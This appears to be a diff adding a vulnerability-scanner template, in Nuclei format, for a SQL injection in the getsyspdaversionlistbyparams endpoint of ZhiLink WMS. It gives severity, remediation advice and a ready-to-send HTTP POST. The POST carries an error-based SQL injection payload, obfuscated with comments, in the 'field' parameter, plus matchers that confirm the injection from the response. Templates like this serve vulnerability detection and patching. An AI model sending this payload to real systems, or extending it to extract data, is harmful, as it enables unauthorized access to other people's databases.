@@ -1,0 +1,52 @@
+id: zhilink-wms-getsyspdaversionlistbyparams-sqli
+
+info:
+  name: ZhiLink WMS ISysPdaVersionService getsyspdaversionlistbyparams SQL Injection
+  author: qwtd
+  severity: high
+  description: A SQL injection vulnerability exists in the `getsyspdaversionlistbyparams` interface of ZhiLink WMS. Insufficient validation of user-supplied input allows attackers to inject arbitrary SQL statements, potentially leading to unauthorized database access and sensitive information disclosure.
+  impact: Successful exploitation may allow attackers to extract sensitive data, enumerate database structures, bypass application logic, modify database contents, or gain further access depending on database privileges.
+  remediation: Upgrade to the latest vendor version, implement parameterized queries, and perform strict server-side validation and sanitization of all user-controlled input.
+  reference:
+    - https://www.gm7.org/archives/96709
+  classification:
+    cwe-id: CWE-89
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
+    cvss-score: 9.1
+  metadata:
+    vendor: ZhiLink
+    product: WMS
+    verified: true
+    vuln-labels: SQL注入
+  tags: ZhiLink WMS
+
+http:
+  - raw:
+      - |
+        POST /dapilc/restful/service/ilcwmsplus/ISysPdaVersionService/getsyspdaversionlistbyparams HTTP/1.1
+        User-Agent: Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36(KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Content-Length: 246
+
+        {
+          "condition": {
+            "field": "createDate,(select/**/5422/**/from(select/**/count(*),concat(0x7e,md5(1),0x7e,floor(rand(0)*2))x/**/from/**/information_schema.plugins/**/group/**/by/**/x)a)",
+            "order": "asc"
+          },
+          "current": 1,
+          "size": 1
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "c4ca4238a0b923820dcc509a6f75849b"
